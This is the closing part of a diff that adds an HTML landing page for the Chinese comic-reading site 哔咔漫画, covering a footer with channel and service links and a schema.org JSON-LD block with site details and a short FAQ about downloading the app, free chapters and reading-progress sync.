+                <div><strong>10,000+</strong><span>每日更新章节</span></div>
+                <div><strong>99.9%</strong><span>服务可用性</span></div>
+            </div>
+        </div>
+    </div>
+</section>
+</main>
+
+<!-- ============ 页脚 ============ -->
+<footer class="foot">
+    <div class="wrap">
+        <div class="foot-grid">
+            <div class="foot-txt">
+                <h4>哔咔漫画</h4>
+                <p>哔咔漫画官方平台，致力于为用户提供正版、高清、流畅的漫画阅读体验，海量漫画资源每日更新。</p>
+                <p class="foot-url">官网网址：https://bikamanhua-app.com</p>
+            </div>
+            <div>
+                <h4>漫画频道</h4>
+                <ul>
+                    <li><a href="#categories">热血冒险漫画</a></li>
+                    <li><a href="#categories">青春恋爱漫画</a></li>
+                    <li><a href="#categories">悬疑推理漫画</a></li>
+                    <li><a href="#categories">古风玄幻漫画</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>产品服务</h4>
+                <ul>
+                    <li><a href="#download">哔咔漫画APP下载</a></li>
+                    <li><a href="#features">会员权益说明</a></li>
+                    <li><a href="#ranking">热门漫画排行</a></li>
+                    <li><a href="#faq">阅读帮助中心</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>关于我们</h4>
+                <ul>
+                    <li><a href="#about">平台介绍</a></li>
+                    <li><a href="#about">版权合作</a></li>
+                    <li><a href="#reviews">用户评价</a></li>
+                    <li><a href="#home">返回首页</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copy">
+            <p>Copyright © 2026 哔咔漫画 bikamanhua-app.com 版权所有</p>
+            <p><a href="#">用户协议</a> · <a href="#">隐私政策</a> · <a href="#">内容举报</a></p>
+        </div>
+    </div>
+</footer>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "name": "哔咔漫画",
+      "alternateName": "bikamanhua-app",
+      "url": "https://bikamanhua-app.com/",
+      "description": "哔咔漫画官方平台，提供正版APP下载、海量漫画分类、热门排行榜与高清在线漫画阅读服务。",
+      "inLanguage": "zh-CN",
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": "https://bikamanhua-app.com/search?q={search_term_string}",
+        "query-input": "required name=search_term_string"
+      }
+    },
+    {
+      "@type": "Organization",
+      "name": "哔咔漫画",
+      "url": "https://bikamanhua-app.com/",
+      "description": "专注于正版漫画分发与阅读体验优化的漫画阅读平台。"
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "哔咔漫画APP如何下载安装？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "在本页APP下载栏目中选择对应终端，点击下载按钮获取官方安装包，安装后注册登录即可开始阅读。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "哔咔漫画是完全免费的吗？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "哔咔漫画提供大量免费漫画章节，部分新作首发章节与高清图源支持会员权益解锁。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "阅读进度可以在多个设备间同步吗？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "使用同一账号登录后，哔咔漫画会自动云端同步书架、收藏与阅读进度，支持手机、平板与网页端切换。"
+          }
+        }
+      ]
+    }
+  ]
+}
+</script>
+</body>
+</html>
